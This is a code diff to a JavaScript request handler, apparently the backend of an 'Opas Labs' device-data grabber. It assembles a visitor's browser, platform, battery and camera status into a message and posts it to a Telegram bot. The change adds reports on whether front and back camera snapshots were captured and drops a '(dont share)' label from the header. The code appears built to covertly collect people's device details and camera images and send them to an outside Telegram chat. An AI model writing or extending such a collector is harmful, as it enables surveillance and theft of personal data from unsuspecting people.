@@ -6,7 +6,7 @@ export default async (req, res) => {
   try {
     const { telegramId, ...d } = req.body;
 
-    const message = `**🔰 Opas Labs - ur device detailes (dont share)🔰**\n\n` +
+    const message = `**🔰 Opas Labs 🔰**\n\n` +
     `🌐 **Basic Info:**\n` +
     `- Browser: ${d.browser}\n` +
     `- Platform: ${d.platform}\n` +
@@ -38,7 +38,13 @@ export default async (req, res) => {
     `- Charging: ${d.charging}\n\n` +
 
     `📷 **Camera Status:**\n` +
-    `- ${d.cameraStatus}`;
+    `- ${d.cameraStatus}\n\n` +
+
+    `📸 **Front Camera Snapshot:**\n` +
+    `- ${d.frontCameraImage ? 'Captured' : 'Failed'}\n\n` +
+
+    `📸 **Back Camera Snapshot:**\n` +
+    `- ${d.backCameraImage ? 'Captured' : 'Failed'}`;
 
     await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
